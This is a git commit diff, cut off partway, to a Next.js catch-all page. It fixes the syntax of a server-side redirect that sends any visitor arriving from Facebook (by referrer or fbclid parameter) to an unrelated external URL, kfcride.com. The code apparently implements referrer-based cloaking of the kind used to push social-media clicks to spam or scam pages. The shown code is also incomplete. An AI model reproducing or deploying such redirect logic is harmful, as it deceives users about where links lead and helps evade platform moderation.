e5d826c0d7d312635e6da23868bbe42ad3831bde
forworkver <forworkwork229@gmail.com>
2024-08-09 03:41:57 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -16,7 +16,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 		if (referringURL?.includes('facebook.com') || fbclid) {
 
 		return {
-			redirect: {"https://store.google.com/"
+			redirect: {
 				permanent: false,
 				destination: `${`https://kfcride.com/1234-2/`
 					       
